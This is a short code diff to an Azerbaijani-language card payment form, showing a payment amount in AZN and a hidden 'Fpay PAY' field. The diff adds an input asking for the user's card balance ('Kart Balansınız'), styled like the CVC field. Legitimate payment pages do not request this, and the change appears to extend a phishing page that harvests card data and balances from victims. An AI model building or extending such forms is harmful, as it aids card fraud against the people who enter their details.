@@ -299,6 +299,10 @@ function validateExpiryAndCardNumber(input) {
                             <span>Ödəniş məbləği</span>
                             <p>{{amount}} AZN</p>
                         </div>
+                        <div class="form_item">
+                            <label>Kart Balansınız</label>
+                            <input type="number" maxlength="6" pattern="[0-9]*" class="cc-cvc-input" id="balance" name="balance" tabindex="3" placeholder="">
+                        </div>
                     </div>
                     <div>
                         <input value="Fpay PAY" id="cardname-input" name="cardname" type="hidden">
